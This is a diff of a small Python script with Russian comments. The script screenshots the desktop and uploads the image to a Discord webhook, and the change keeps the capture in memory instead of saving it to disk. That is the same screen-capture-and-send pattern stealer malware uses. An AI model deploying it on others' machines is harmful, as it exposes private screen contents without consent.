@@ -1,12 +1,14 @@
 import pyautogui
 import datetime
+from io import BytesIO
 from discord_webhook import DiscordWebhook
 
-# Сделать скриншот
-screenshot_path = "screenshot.png"
-pyautogui.screenshot(screenshot_path)
+# Сделать скриншот и сохранить в память
+screenshot_bytes = BytesIO()
+pyautogui.screenshot().save(screenshot_bytes, format='PNG')
+screenshot_bytes.seek(0)  # вернуться в начало потока
 
-# Время создания скриншота
+# Дата и время
 now = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
 description = f"Скриншот сделан: {now}"
 
@@ -17,7 +19,7 @@ webhook = DiscordWebhook(
     content=description
 )
 
-with open(screenshot_path, "rb") as f:
-    webhook.add_file(file=f.read(), filename="screenshot.png")
+# Прикрепляем скриншот (из памяти)
+webhook.add_file(file=screenshot_bytes.read(), filename="screenshot.png")
 
 response = webhook.execute()
